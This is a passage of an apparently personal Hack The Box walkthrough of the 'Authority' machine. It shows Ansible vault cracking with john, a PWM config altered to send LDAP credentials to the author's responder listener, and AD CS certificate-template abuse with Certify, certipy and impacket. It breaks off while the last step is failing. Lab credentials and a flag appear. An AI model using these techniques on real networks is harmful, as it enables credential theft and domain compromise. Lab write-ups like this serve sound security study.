+ldap_base_dn: &quot;DC=authority,DC=htb&quot;
+ldap_admin_password: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          63303831303534303266356462373731393561313363313038376166336536666232626461653630
+          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
+          34646237336164356438383034623462323531316333623135383134656263663266653938333334
+          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
+          3764</code></pre><p id="4019008b-c0cc-4e30-bc77-8bde705dabb7" class="">
+</p><p id="eb24cea6-75a6-4c10-a2cc-5f2c44b095fa" class="">Vault cracking for Ansible</p><figure id="e25e3768-8fce-4d8a-b46d-561baf161bd1"><a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Ansible</div></div><div class="bookmark-href"><img src="https://2607403046-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/spaces%2F-MZ5E8Fq0UBQAc7rbfId%2Favatar-1620169112076.png?generation=1620169112516838&amp;alt=media" class="icon bookmark-icon"/>https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible</div></div><img src="https://www.gitbook.com/cdn-cgi/image/width=1280,dpr=2,height=640,fit=contain,format=auto/https%3A%2F%2F2607403046-files.gitbook.io%2F~%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MZ5E8Fq0UBQAc7rbfId%252Fsocialpreview%252FO9NV913SeHszQuNmUZEV%252Flogo.png%3Falt%3Dmedia%26token%3D017365ae-f1c5-4447-8b8a-16a5c2d8494d" class="bookmark-image"/></a></figure><p id="72e2ca6e-09cf-41d6-a63b-9109ba205274" class="">
+</p><p id="dd483bb0-faed-4bb7-b81e-45ee2d0b6529" class="">Extracted the hashes for each</p><p id="325695d3-e865-4e69-991a-d2e2e3314407" class=""><code>ansible2john pwm_admin_login &gt; admin_login</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="118feea0-5333-4be0-8145-c1569eca50f7" class="code"><code class="language-Rust">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt admin_login 
+Using default input encoding: UTF-8
+Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
+Cost 1 (iteration count) is 10000 for all loaded hashes
+Will run 2 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+!@#$%^&amp;*         (pwm_admin_login)     
+1g 0:00:00:33 DONE (2023-07-17 15:05) 0.02966g/s 1180p/s 1180c/s 1180C/s 001983..victor2
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</code></pre><p id="e1a1b82d-6c2c-4874-b109-b48f932ece4c" class=""><code>!@#$%^&amp;* - pwm_admin_login</code></p><p id="1cb26a2b-8a04-4bfd-ad39-748c5a9b2f1d" class="">
+</p><p id="de548f39-1bdf-48cf-8582-524db6abf792" class="">password:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3904d865-3d95-4a6c-8da1-67e8d18d390c" class="code"><code class="language-Rust">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt admin_pass 
+Using default input encoding: UTF-8
+Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
+Cost 1 (iteration count) is 10000 for all loaded hashes
+Will run 2 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+!@#$%^&amp;*         (pwm_admin_password)     
+1g 0:00:00:33 DONE (2023-07-17 15:07) 0.02951g/s 1174p/s 1174c/s 1174C/s 001983..victor2
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</code></pre><p id="023e6a1e-88f9-417e-82e8-1f4c25974297" class="">Ldap admin pass:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a7360561-d98f-4545-bd53-abee3c02332f" class="code"><code class="language-Rust">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ldap_admin_pass 
+Using default input encoding: UTF-8
+Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
+Cost 1 (iteration count) is 10000 for all loaded hashes
+Will run 2 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+!@#$%^&amp;*         (ldap_admin_password)     
+1g 0:00:00:38 DONE (2023-07-17 15:08) 0.02625g/s 1045p/s 1045c/s 1045C/s 001983..victor2
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</code></pre><p id="c70bd994-46a1-4704-9b79-26605b847d9a" class="">
+</p><p id="b4effa16-279c-4093-ace4-525cecf552e1" class="">Ok, now with the password decrypt the vault</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="15f1dfc6-33f8-4bb0-ac3c-984b359fe7d0" class="code"><code class="language-Rust">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]
+└─$ cat pwm_admin_password| ansible-vault decrypt
+Vault password: 
+Decryption successful
+pWm_@dm!N_!23</code></pre><p id="dce52b6d-efca-4413-b876-b78b6a3ed794" class="">password: pWm_@dm!N_!23</p><p id="9a038f7a-d4f5-46ea-bdf6-f8e2535dfb53" class="">login: svc_pwm</p><p id="c36787c1-00ca-406d-a72c-3137e226b985" class="">
+</p><p id="b858efbe-cad9-4c52-b7f2-cde6565333f1" class="">And we are in the configuration dashboard</p><p id="9301c108-98b7-4273-8f0d-86dd51d3dee8" class="">
+</p><figure id="babd74d3-754b-457e-b894-c21d1d0d1dfd" class="image"><a href="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled%201.png"><img style="width:1308px" src="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled%201.png"/></a></figure><p id="0b5aaa70-7f22-4790-b856-fb9a961bff77" class="">
+</p><figure id="43e754f8-db94-4fc3-a538-662bfd7e23db" class="image"><a href="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled%202.png"><img style="width:1568px" src="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled%202.png"/></a></figure><p id="bf59e59d-9ebb-46ea-93a8-97dc1aaa2375" class="">
+</p><p id="6ed6c6ef-20bb-4562-81d8-07394da57637" class="">Configurations settings</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cffb9455-9d21-4df3-9cfe-fba92368b56a" class="code"><code class="language-Rust">Configuration Summary
+PWM   v2.0.3 bc96802e
+Current Time: 2023-07-17T23:32:55Z
+
+
+Only settings modified from their default value are shown.
+
+Setting ⇨ Default Settings ⇨ LDAP Vendor Default Settings
+AD
+
+Setting ⇨ Default Settings ⇨ Storage Default Settings
+LOCALDB
+
+Setting ⇨ LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Certificates
+
+Setting ⇨ LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Contextless Login Roots
+CN=Users,DC=authority,DC=htb
+
+Setting ⇨ LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password
+*hidden*
+
+Setting ⇨ LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy User
+CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
+
+Setting ⇨ LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs
+ldaps://authority.authority.htb:636
+
+Setting ⇨ Modules ⇨ Authenticated ⇨ Administration ⇨ Administrator Permission
+UserPermission: LDAP User: [Profile: All User: CN=svc_pwm,CN=Users,DC=authority,DC=htb]
+
+Setting ⇨ Settings ⇨ Application ⇨ Application ⇨ Site URL
+https://172.16.2.118:8443/pwm
+
+Setting ⇨ Settings ⇨ Security ⇨ Application Security ⇨ Security Key
+*hidden*
+
+Setting ⇨ Settings ⇨ Security ⇨ Application Security ⇨ Show Detailed Error Messages</code></pre><p id="d6f3c4f1-92ab-4d45-a5b8-40a1e6465d79" class="">
+</p><p id="cd7e428a-d937-4a48-a29c-2e1cf6baf16c" class="">We can download a config file that we can change and point to our own LDAP server</p><p id="8ee7836d-d0f6-4702-a594-8dd36f187d74" class="">Snippet from the file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="87b83141-6658-4583-a8f5-c6f4e0287e0d" class="code"><code class="language-Rust">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;PwmConfiguration createTime=&quot;2022-08-11T01:46:23Z&quot; modifyTime=&quot;2022-08-11T01:46:24Z&quot; pwmBuild=&quot;c96802e&quot; pwmVersion=&quot;2.0.3&quot; xmlVersion=&quot;5&quot;&gt;
+    &lt;!--
+		This configuration file has been auto-generated by the PWM password self service application.
+
+		WARNING: This configuration file contains sensitive security information, please handle with care!
+
+		WARNING: If a server is currently running using this configuration file, it will be restarted and the
+	         configuration updated immediately when it is modified.
+
+		NOTICE: This file is encoded as UTF-8.  Do not save or edit this file with an editor that does not
+		        support UTF-8 encoding.
+
+		If unable to edit using the application ConfigurationEditor web UI, the following options are available:
+		      1. Edit this file directly by hand.
+		      2. Remove restrictions of the configuration by setting the property &quot;configIsEditable&quot; to &quot;true&quot;.
+		         This will allow access to the ConfigurationEditor web UI without having to authenticate to an
+		         LDAP server first.
+
+		If you wish for sensitive values in this configuration file to be stored unencrypted, set the property
+		&quot;storePlaintextValues&quot; to &quot;true&quot;.
+--&gt;
+    &lt;properties type=&quot;config&quot;&gt;
+        &lt;property key=&quot;configIsEditable&quot;&gt;true&lt;/property&gt;
+        &lt;property key=&quot;configEpoch&quot;&gt;0&lt;/property&gt;
+        &lt;property key=&quot;configPasswordHash&quot;&gt;$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua&lt;/property&gt;
+    &lt;/properties&gt;
+    &lt;settings&gt;
+        &lt;setting key=&quot;notes.noteText&quot; syntax=&quot;TEXT_AREA&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;Configuration Notes ⇨ Configuration Notes&lt;/label&gt;
+            &lt;default/&gt;
+        &lt;/setting&gt;
+        &lt;setting key=&quot;template.ldap&quot; modifyTime=&quot;2022-08-11T01:46:23Z&quot; syntax=&quot;SELECT&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;Default Settings ⇨ LDAP Vendor Default Settings&lt;/label&gt;
+            &lt;value&gt;AD&lt;/value&gt;
+        &lt;/setting&gt;
+        &lt;setting key=&quot;template.storage&quot; modifyTime=&quot;2022-08-11T01:46:23Z&quot; syntax=&quot;SELECT&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;Default Settings ⇨ Storage Default Settings&lt;/label&gt;
+            &lt;value&gt;LOCALDB&lt;/value&gt;
+        &lt;/setting&gt;
+        &lt;setting key=&quot;ldap.guid.autoAddValue&quot; profile=&quot;default&quot; syntax=&quot;BOOLEAN&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ Auto Add GUID Value&lt;/label&gt;
+            &lt;default/&gt;
+        &lt;/setting&gt;
+        &lt;setting key=&quot;ldap.serverCerts&quot; modifyTime=&quot;2022-08-11T01:46:23Z&quot; profile=&quot;default&quot; syntax=&quot;X509CERT&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Certificates&lt;/label&gt;
+            &lt;value/&gt;
+        &lt;/setting&gt;
+        &lt;setting key=&quot;ldap.rootContexts&quot; modifyTime=&quot;2022-08-11T01:46:23Z&quot; profile=&quot;default&quot; syntax=&quot;STRING_ARRAY&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Contextless Login Roots&lt;/label&gt;
+            &lt;value&gt;CN=Users,DC=authority,DC=htb&lt;/value&gt;
+        &lt;/setting&gt;
+        &lt;setting key=&quot;ldap.profile.enabled&quot; profile=&quot;default&quot; syntax=&quot;BOOLEAN&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Profile Enabled&lt;/label&gt;
+            &lt;default/&gt;
+        &lt;/setting&gt;
+        &lt;setting key=&quot;ldap.proxy.password&quot; modifyTime=&quot;2022-08-11T01:46:23Z&quot; profile=&quot;default&quot; syntax=&quot;PASSWORD&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password&lt;/label&gt;
+            &lt;value&gt;ENC-PW:azgDngImDKP3hX4arfw7oM4z41pW7wVTsQBIhdDeilgPqdfgjmexRopHybZ8Z9LTTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=&lt;/value&gt;
+        &lt;/setting&gt;
+        &lt;setting key=&quot;ldap.proxy.username&quot; modifyTime=&quot;2022-08-11T01:46:23Z&quot; profile=&quot;default&quot; syntax=&quot;STRING&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy User&lt;/label&gt;
+            &lt;value&gt;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb&lt;/value&gt;
+        &lt;/setting&gt;
+        &lt;setting key=&quot;ldap.search.timeoutSeconds&quot; profile=&quot;default&quot; syntax=&quot;DURATION&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Search Timeout&lt;/label&gt;
+            &lt;default/&gt;
+        &lt;/setting&gt;
+        &lt;setting key=&quot;ldap.testuser.username&quot; modifyTime=&quot;2022-08-11T01:46:23Z&quot; profile=&quot;default&quot; syntax=&quot;STRING&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Test User&lt;/label&gt;
+            &lt;default/&gt;
+        &lt;/setting&gt;
+        &lt;setting key=&quot;ldap.serverUrls&quot; modifyTime=&quot;2022-08-11T01:46:23Z&quot; profile=&quot;default&quot; syntax=&quot;STRING_ARRAY&quot; syntaxVersion=&quot;0&quot;&gt;
+            &lt;label&gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs&lt;/label&gt;
+            &lt;value&gt;ldap://10.10.14.37:389&lt;/value&gt;</code></pre><p id="e154fb74-abc6-4e46-9a3a-e28272cc23f5" class="">
+</p><p id="509ac80f-2090-464c-bf25-c3dfa5931786" class="">The value below is pointing at our server and we should get cleartext passwords!</p><p id="bce0bfc0-b33e-45e9-8790-bc15ba81a62d" class=""><code>&lt;value&gt;ldap://10.10.14.37:389&lt;/value&gt;</code></p><p id="b0d36ca4-6416-41f8-8adb-f991a0c08e1b" class="">
+</p><p id="c6eae856-0f36-4976-9fd8-c34ab2701743" class="">The previous value  was</p><p id="065f12f2-9f9d-490a-9965-89b14f72c729" class="">&lt;label&gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs&lt;/label&gt;<br/><br/><code>&lt;value&gt;ldaps://authority.authority.htb:636&lt;/value&gt;</code></p><p id="40a5f0fa-c564-45a4-8bff-f1a3d5db2dee" class="">
+</p><p id="00ce33f1-775b-4fab-8a08-fb0443b27805" class="">
+</p><p id="e967ca6b-831a-4827-932a-d68981538ad3" class="">Or we can just change the value and point at our IP to get the creds in cleartext!<br/><br/></p><figure id="385fa007-79f7-4421-bdb5-999f25ad6d3f" class="image"><a href="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled%203.png"><img style="width:1070px" src="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled%203.png"/></a></figure><p id="4d15c9ab-48e8-48c8-81bf-e1706fddb3fe" class="">
+</p><p id="22685f68-c77d-4a22-b257-2046dc1deff2" class="">Start responder, reupload the file and we should get the creds</p><p id="d9f30f1d-ba78-4890-9ae4-f74b977d927d" class=""><code>sudo responder -I tun0 -wPv</code><br/><br/></p><figure id="848b6310-e5c0-4d89-ae60-f91dde8bdfba" class="image"><a href="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled%204.png"><img style="width:818px" src="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled%204.png"/></a></figure><p id="189c7a9b-8282-4c9a-a492-060fa9427bfc" class="">
+</p><p id="75156a78-1bc2-4432-a1e3-3c7da3f9818d" class=""><mark class="highlight-teal">credentials: lDaP_1n_th3_cle4r!</mark></p><p id="4edfd261-2dd8-4ab7-bcf2-fddf85b77944" class=""><mark class="highlight-teal">user: svc_ldap</mark></p><p id="28060f7f-0c20-4d7b-b039-bcfedfb9b811" class="">Can we login as svc_ldap? YES</p><p id="95e4d691-304a-4146-8ccf-dfc8c6d5668b" class="">
+</p><figure id="3065db12-5de1-4b81-8155-95984ac78f1d" class="image"><a href="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled%205.png"><img style="width:812px" src="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled%205.png"/></a></figure><p id="fdf186f7-38c5-4c2a-ae50-4bb5f6cac07f" class="">
+</p><p id="5865de8a-5638-4d3f-891e-4a4618113476" class=""><mark class="highlight-teal">user: e60bf8bf958577c9255072b52523dab4</mark></p><hr id="fd87a0f2-940c-44e8-8c0f-f3e26f58b190"/><hr id="28938b83-24c3-4e37-8af5-87caaa8e5532"/><hr id="0231f95e-3243-4976-8c43-4855d4dfd3b0"/><p id="dfdb1a29-b696-49b5-887a-9921e93d1619" class="">
+</p><p id="33278010-55b4-42e7-91ef-a3f1dd9ca417" class="">Root:</p><p id="583982c1-96fd-4aa7-95cc-32c63df5ae0b" class="">Find vulnerable certs, as we saw there is a pfx file</p><p id="5959da6a-4c04-485e-954a-635161340631" class="">transferred over certify.exe on the box and this is the output of the command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3d97e5e5-c4f6-4a61-aebf-ec776fa67827" class="code"><code class="language-Rust">Certify completed in 00:00:00.0023895
+*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt; .\Certify.exe find /vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ &#x27;__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base &#x27;CN=Configuration,DC=authority,DC=htb&#x27;
+
+[*] Listing info about the Enterprise CA &#x27;AUTHORITY-CA&#x27;
+
+    Enterprise CA Name            : AUTHORITY-CA
+    DNS Hostname                  : authority.authority.htb
+    FullName                      : authority.authority.htb\AUTHORITY-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
+    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
+    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
+    Cert Start Date               : 4/23/2023 9:46:26 PM
+    Cert End Date                 : 4/23/2123 9:56:25 PM
+    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : authority.authority.htb\AUTHORITY-CA
+    Template Name                         : CorpVPN
+    Schema Version                        : 2
+    Validity Period                       : 20 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+      Object Control Permissions
+        Owner                       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+        WriteOwner Principals       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+        WriteDacl Principals        : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+        WriteProperty Principals    : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+
+
+
+Certify completed in 00:00:10.2046062</code></pre><p id="c1bc0769-0f9d-42e9-ba81-936c47ebb492" class="">
+</p><p id="53543de5-441e-4c34-a488-beeaff3dfc28" class="">Or from our Kali machine:</p><p id="ad41b922-7442-4521-b65a-2adbef1a0e1d" class=""><code>certipy find -u svc_ldap@authority.htb -p &#x27;lDaP_1n_th3_cle4r!&#x27; -dc-ip 10.129.160.230</code></p><p id="c1a4b00f-2717-41c4-8b60-1cb0ed8b4d3c" class="">
+</p><p id="266c968a-5d93-4d66-9d4f-a5e30665566a" class="">
+</p><p id="a58fe92c-f46e-40ce-bebb-f3085222e7c9" class="">Using impacket-addcomputer</p><p id="30730d68-0ec7-4c71-a12d-9f3fa04d838b" class=""><code>impacket-addcomputer authority.htb/svc_ldap:&#x27;lDaP_1n_th3_cle4r!&#x27; -computer-name RANDOM$ -computer-pass &#x27;Random!&#x27;</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="468719be-e85c-4a1d-a591-04c24971db00" class="code"><code class="language-Rust">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]
+└─$ impacket-addcomputer authority.htb/svc_ldap:&#x27;lDaP_1n_th3_cle4r!&#x27; -computer-nam RANDOM$ -computer-pass &#x27;Random!&#x27;
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Successfully added machine account RANDOM$ with password Random!.</code></pre><p id="fde52432-6bf2-4d49-8f66-ac7702e4280a" class="">
+</p><p id="10953109-ab67-4d7f-b724-e2a5d74d4b6d" class="">Using certipy for cert abuse</p><p id="4a0ab8ee-079c-4003-842c-ac6c7c45a93c" class=""><code>certipy req -u DAM$ -p P@ssword -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.129.160.230</code></p><p id="5cabef93-4684-4d0d-bfe5-83d8730fa308" class="">
+</p><p id="a4aca088-ad65-49e8-91b6-73ef3ef2dc33" class="">Not working as expected unfortunately…</p><p id="777afa85-9416-4860-9ca9-dbaaf13854a3" class="">
